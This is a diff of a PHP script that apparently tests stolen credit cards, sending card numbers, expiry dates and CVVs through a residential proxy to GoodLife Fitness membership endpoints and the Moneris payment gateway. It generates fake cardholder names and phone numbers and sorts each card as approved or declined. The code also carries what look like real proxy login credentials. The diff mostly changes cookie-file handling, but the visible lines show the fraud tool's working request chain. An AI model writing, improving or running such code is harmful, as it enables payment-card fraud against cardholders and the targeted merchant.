@@ -7,6 +7,12 @@ set_time_limit(0);
 
 is_dir('COOKIE') || mkdir('COOKIE', 0755, true);
 
+$d = __DIR__ . '/COOKIE';
+
+$ii = [
+  'cookie' => $d . '/' . mt_rand() . '.txt'
+];
+
 ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
 error_reporting(E_ALL);
@@ -118,19 +124,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ano2 = substr($ano, -2);
     $cvv = $ccs[3];
 
-    $ii = [
-      'cookie' => 'COOKIE/' . mt_rand() . '.txt'
-    ];
-
-    // $firstnum = $cc[0];
-    // if ($firstnum == '5') {
-    //   $typee = 'MC'; //VISADEBIT
-    //   $typee2 = 'Mastercard';
-    // }
-    // if ($firstnum == '4') {
-    //   $typee = 'VI'; //VISACREDIT
-    //   $typee2 = 'Visa';
-    // }
 
     $name = fname();
     $last = lname();
@@ -142,6 +135,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $caphone =
       sprintf('(705) %03d-%04d', rand(200, 999), rand(1000, 9999));
     $usPhone = usPhone();
+
     $d1 = getcwd();
     $d = str_replace('\\', '/', $d1);
 
@@ -466,8 +460,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.CreatePersonByPerson.json");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_POST, 1);
@@ -492,8 +486,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.GetTicket.json");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_HTTPGET, 1);
@@ -517,8 +511,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/index.php?tck=$ticket");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_HTTPGET, 1);
@@ -539,8 +533,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_POST, 1);
@@ -566,8 +560,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_POST, 1);
@@ -592,8 +586,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://gateway.moneris.com/chkt/display/request.php");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_POST, 1);
@@ -618,8 +612,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $g = curl_init();
     curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
     curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
-    curl_setopt($g, CURLOPT_COOKIEJAR, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
-    curl_setopt($g, CURLOPT_COOKIEFILE, "" . $d . "/COOKIE/" . $ii['cookie'] . "");
+    curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
+    curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://www.goodlifefitness.com/content/goodlife/en/membership/e-commerce/jcr:content/root/responsivegrid/membershipecommerce.ProcessCardSale.json");
     curl_setopt($g, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($g, CURLOPT_POST, 1);
@@ -649,10 +643,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => "Moneris -> $msg"];
     }
 
-    $cookieFile = __DIR__ . '/COOKIE/' . $ii['cookie'];
-    if (file_exists($cookieFile)) {
-      unlink($cookieFile);
-    }
 
     curl_close($g);
   }
